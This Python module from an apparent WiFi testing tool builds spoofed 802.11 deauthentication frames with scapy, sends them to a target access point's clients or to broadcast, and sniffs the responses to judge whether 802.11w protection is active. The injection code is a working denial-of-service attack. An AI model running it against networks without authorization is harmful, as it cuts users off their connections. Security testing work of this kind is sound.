"""
modules/deauth_attack.py
Author: Martin Živný

Description
-----------
This module implements a WiFi deauthentication test in the ptwifi tool.

It constructs IEEE 802.11 deauthentication frames and transmits them toward
a specified Access Point and/or client station. 
It performs an automated PMF (802.11w) test by analyzing post-attack traffic
for reconnection attempts (Auth/Assoc frames) vs uninterrupted data flow.
Results are written directly to the provided AP object.
"""

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp, sniff
from helpers.classes import AP

TIMEOUT_TIME = 1
PACKET_COUNT = 50
INTERVAL_SEC = 0.1

def run(interface: str, target_ap: AP, time_period: float = None, number: int = None, burst_number: int = None) -> None:
    """
    Executes the deauthentication test to evaluate PMF (IEEE 802.11w) protection.
    Injects spoofed management frames and analyzes the subsequent client behavior.

    Args:
        interface (str): The name of the wireless interface in monitor mode.
        target_ap (AP): The Access Point object representing the test target.
        time_period (float, optional): Custom interval between injected packets in milliseconds.
        number (int, optional): Custom number of packets to inject.
        burst_number (int, optional): Unused parameter for future burst expansion.
    """
    if not hasattr(target_ap, 'test_results'):
        target_ap.test_results = {}

    inter_sec = (time_period / 1000.0) if time_period is not None else 0.05
    packet_count = PACKET_COUNT

    associated_stas = getattr(target_ap, 'associated_STAs', [])

    # 1. Targeted Unicast Attack
    if associated_stas and len(associated_stas[0]) == 17:
        for sta_mac in associated_stas:
            print(f"\n[*] 802.11w Test: Sending {packet_count} unicast deauth frames to {sta_mac}...")
            
            dot11 = Dot11(addr1=sta_mac, addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
            
            sendp(packet, iface=interface, count=PACKET_COUNT, inter=INTERVAL_SEC, verbose=False)

            print(f"[*] Attack finished. Monitoring for response ({TIMEOUT_TIME}s)...")
            
            frames = sniff(
                iface=interface, 
                timeout=TIMEOUT_TIME, 
                lfilter=lambda x: x.haslayer(Dot11) and x.addr2 and x.addr2.upper() == sta_mac.upper()
            )

            result_key = f"802.11w_{sta_mac}"
            
            reconnect_frames = [f for f in frames if f.type == 0 and f.subtype in (0, 2, 11)]
            data_frames = [f for f in frames if f.type == 2 or f.type == 1]

            if len(reconnect_frames) > 0:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and is attempting to reconnect.")
                target_ap.test_results[result_key] = "Disconnected (Reconnecting)"
            elif len(data_frames) > 0:
                print(f"[+] PMF Active: Station {sta_mac} ignored deauth and continues data transmission.")
                target_ap.test_results[result_key] = "Active/Ignored"
            else:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and went silent.")
                target_ap.test_results[result_key] = "Disconnected (Silent)"

    # 2. Broadcast Attack
    else:
        print(f"\n[*] 802.11w Test: No associated STAs found. Sending {packet_count} broadcast deauth frames...")
        
        dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        sendp(packet, iface=interface, count=PACKET_COUNT, inter=INTERVAL_SEC, verbose=False)
        
        print(f"[*] Attack finished. Monitoring for BSS traffic ({TIMEOUT_TIME}s)...")
        
        frames = sniff(
            iface=interface, 
            timeout=TIMEOUT_TIME,
            lfilter=lambda x: x.haslayer(Dot11) and (
                (x.addr1 and x.addr1.upper() == target_ap.bssid.upper()) or 
                (x.addr2 and x.addr2.upper() == target_ap.bssid.upper()) or 
                (x.addr3 and x.addr3.upper() == target_ap.bssid.upper())
            )
        )

        result_key = "802.11w_Broadcast"
        
        reconnecting_macs = set(f.addr2 for f in frames if f.type == 0 and f.subtype in (0, 2, 11) and f.addr2)
        surviving_macs = set(f.addr2 for f in frames if f.type == 2 and f.addr2 and f.addr2 not in reconnecting_macs)
        
        reconnecting_macs.discard(target_ap.bssid)
        surviving_macs.discard(target_ap.bssid)

        if surviving_macs:
            print(f"[+] Hidden clients detected! PMF Active for MACs: {', '.join(surviving_macs)}")
            target_ap.test_results[result_key] = f"Active/Ignored (Hidden clients: {', '.join(surviving_macs)})"
        elif reconnecting_macs:
            print(f"[-] PMF Inactive: Hidden clients {', '.join(reconnecting_macs)} attempting to reconnect.")
            target_ap.test_results[result_key] = f"Disconnected/Reconnecting (Hidden clients: {', '.join(reconnecting_macs)})"
        else:
            print("[-] No clients detected (or all successfully disconnected and silent).")
            target_ap.test_results[result_key] = "No connected clients"